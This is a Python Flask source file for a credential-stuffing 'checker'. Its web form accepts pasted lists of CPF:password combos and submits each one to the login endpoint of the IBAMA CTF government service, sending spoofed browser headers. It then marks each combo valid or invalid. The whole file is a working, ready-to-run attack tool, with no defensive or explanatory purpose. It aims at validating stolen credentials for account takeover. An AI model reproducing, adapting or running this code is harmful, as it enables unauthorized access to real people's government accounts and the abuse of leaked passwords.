from flask import Flask, render_template, request
import requests

app = Flask(__name__)

def check_ibama(cpf, senha):
    session = requests.Session()

    try:
        session.get("https://servicos.ibama.gov.br/ctf/")

        payload = {
            "ajax": "2",
            "aplic": "ctf",
            "login_cpf": cpf,
            "login_senha": senha,
            "formDinAcao": "autenticar",
            "dataType": "json",
            "route": "MjI3NWYwZTdhMmFjMGI4Yzc4ZjBlZDcyZTA1Y2YyMTlmYjZiN2MxYw==",
            "formdin_instance_id": ""
        }

        headers = {
            "Referer": "https://servicos.ibama.gov.br/ctf/",
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        response = session.post(
            "https://servicos.ibama.gov.br/ctf/index.php",
            data=payload,
            headers=headers,
            timeout=15
        )

        json_response = response.json()

        if json_response.get("erro") == "N":
            return f"✅ Válido | {cpf}:{senha}"
        else:
            return f"❌ Inválido | {cpf}:{senha}"
    except Exception as e:
        return f"⚠️ Erro | {cpf}:{senha} | {str(e)}"


@app.route("/", methods=["GET", "POST"])
def index():
    resultados = []
    if request.method == "POST":
        combos = request.form["combos"].splitlines()
        for combo in combos:
            if ":" in combo:
                cpf, senha = combo.strip().split(":", 1)
                resultado = check_ibama(cpf.strip(), senha.strip())
                resultados.append(resultado)
    return render_template("index.html", resultados=resultados)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
